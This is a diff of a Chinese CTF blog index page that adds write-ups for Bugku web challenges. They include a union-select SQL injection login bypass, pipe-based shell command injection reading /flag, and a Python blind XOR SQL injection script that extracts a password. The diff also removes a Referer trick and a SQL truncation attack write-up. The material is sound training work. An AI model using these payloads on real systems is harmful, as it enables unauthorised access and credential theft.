@@ -164,6 +164,208 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-bugku-web-login2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/11/bugku-web-login2/">bugku-web-login2</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/08/11/bugku-web-login2/" class="archive-article-date">
+  	<time datetime="2021-08-11T06:43:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>sqlmap扫目录可以注入，但是内容为空<br>所以不存在猜密码的选项了</p>
+<img src="/2021/08/11/bugku-web-login2/1.PNG" class="" title="1.PNG">
+<p>用repeater发送后看到有个tip 是一串base64加密的字符，解密后明文：</p>
+<img src="/2021/08/11/bugku-web-login2/2.PNG" class="" title="2.PNG">
+
+<p>审计后发现可以构造一个不存在的用户进行登录，查询的密码要和md5加密后的一致，构造payload：<br>username=admin’ union select 1,md5(123)#&amp;password=123</p>
+<p>进入shell界面</p>
+<img src="/2021/08/11/bugku-web-login2/4.PNG" class="" title="4.PNG">
+<img src="/2021/08/11/bugku-web-login2/5.PNG" class="" title="5.PNG">
+
+<p>用<code>|</code>绕过<br>传入<code>123|ls</code>没有回显<br>采用写入文件二次返回的方法查看结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123|ls ..&#x2F;..&#x2F;..&#x2F;&gt;test</span><br></pre></td></tr></table></figure>
+<p>然后访问<a target="_blank" rel="noopener" href="http://114.67.246.176:13110/test">http://114.67.246.176:13110/test</a></p>
+<img src="/2021/08/11/bugku-web-login2/6.PNG" class="" title="6.PNG">
+
+<p>cat出flag<br><code>123|cat /flag&gt;test</code></p>
+<img src="/2021/08/11/bugku-web-login2/7.PNG" class="" title="7.PNG">
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/11/bugku-web-login2/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
+    <article id="post-bugku-web-都过滤了" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/11/bugku-web-%E9%83%BD%E8%BF%87%E6%BB%A4%E4%BA%86/">bugku-web-都过滤了</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/08/11/bugku-web-%E9%83%BD%E8%BF%87%E6%BB%A4%E4%BA%86/" class="archive-article-date">
+  	<time datetime="2021-08-11T05:33:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这道题本来有个DS_Store源码泄露漏洞，不过后来被修了</p>
+<p>现在只能通过sql注入</p>
+<p>另外，如果这道题你手注爆破的思路没有问题，但是怎么都爆破不出来……不要怀疑自己，就是平台的锅，因为这玩意动不动就挂掉，根本就爆破不出来</p>
+<p>看提示没有过滤<code>^</code>和<code>-</code>，可以用异或注入</p>
+<p>可以自己传<code>admin&#39;-(ascii(mid((passwd)from(&quot; + str(i) + &quot;)))=&quot; + str(ord(j)) + &quot;)-&#39;</code>改变j的值测试一下，会发现只有一个的回显是<code>username error</code>,其余都是<code>password error</code></p>
+<p>然后跑脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!-*-coding:utf-8-*-</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;114.67.246.176:15484&#x2F;login.php&quot;</span><br><span class="line"></span><br><span class="line">password &#x3D; &quot;&quot;</span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    payload1 &#x3D; &quot;admin&#39;^(length(passwd)&#x3D;&quot; + str(i) + &quot;)^&#39;&quot;</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &#39;uname&#39;: payload1,</span><br><span class="line">        &#39;passwd&#39;: &#39;123&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    r &#x3D; requests.post(url&#x3D;url, data&#x3D;data)</span><br><span class="line">    if &quot;username error!!@_@&quot; in r.text:</span><br><span class="line">        print(&quot;密码的长度是&quot;+str(i))</span><br><span class="line">        break</span><br><span class="line">for i in range(1, 33):</span><br><span class="line">    for j in &#39;0123456789abcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">        payload &#x3D; &quot;admin&#39;-(ascii(mid((passwd)from(&quot; + str(i) + &quot;)))&#x3D;&quot; + str(ord(j)) + &quot;)-&#39;&quot;</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">        &#39;uname&#39;: payload,</span><br><span class="line">        &#39;passwd&#39;: &#39;123&#39;</span><br><span class="line">        &#125;</span><br><span class="line">        r &#x3D; requests.post(url&#x3D;url, data&#x3D;data)</span><br><span class="line">        #print(r.content)</span><br><span class="line">        if &quot;username error!!@_@&quot; in r.text:</span><br><span class="line">            password +&#x3D; j</span><br><span class="line">            print(password)</span><br><span class="line">            break</span><br><span class="line">print(&quot;密码是&quot;+password)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>得到一串md5，解码出来是<code>bugkuctf</code>,猜出密码是admin，直接登录</p>
+<p>shell界面上，发现过滤了空格，读取权限也不全，flag又不在当前文件夹，只能盲猜flag在根目录<br>所以<code>cat&lt;&gt;/flag</code>得到flag</p>
+<img src="/2021/08/11/bugku-web-%E9%83%BD%E8%BF%87%E6%BB%A4%E4%BA%86/1.PNG" class="" title="1.PNG">
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/11/bugku-web-%E9%83%BD%E8%BF%87%E6%BB%A4%E4%BA%86/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-bugku-web-需要管理员" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -913,197 +1115,9 @@
     </section>
   
   
-    <article id="post-bugku-web-你从哪里来" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/10/bugku-web-%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/">bugku-web-你从哪里来</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/10/bugku-web-%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/" class="archive-article-date">
-  	<time datetime="2021-08-10T12:10:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>没什么意思<br>bp抓包，在头部加一个<code>referer:https://www.google.com/</code></p>
-<img src="/2021/08/10/bugku-web-%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/1.PNG" class="" title="1.PNG">
-
-<p>说实话这道题有点太靠后了，应该放到最前面</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/10/bugku-web-%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-login1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/10/bugku-web-login1/">bugku-web-login1</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/10/bugku-web-login1/" class="archive-article-date">
-  	<time datetime="2021-08-10T11:59:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>打开以后是一个登录系统</p>
-<p>用admin试一试，发现不行</p>
-<p>根据题目提示：SQL约束攻击<br>比如想这道题，我们在创建sql表的时候，都会固定每个表中元素的最大长度，一般编写php也会配合这一长度进行长度过滤，而未过滤的话就会存在sql约束漏洞的攻击<br>可以传入远超sql长度的字符，而sql会自动截取自身的最大字符，从而实现重复注册</p>
-<p>比如我输入admin，会显示“已注册”</p>
-<img src="/2021/08/10/bugku-web-login1/2.PNG" class="" title="2.PNG">
-
-<p>但是输入admin后面加很多空格，则会注入成功</p>
-<img src="/2021/08/10/bugku-web-login1/3.PNG" class="" title="3.PNG">
-
-<p>然后再在登录界面输入注册的用户名和密码就好</p>
-<img src="/2021/08/10/bugku-web-login1/4.PNG" class="" title="4.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/10/bugku-web-login1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/5/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/7/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/5/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/7/">Next &amp;raquo;</a>
     </nav>
   
 
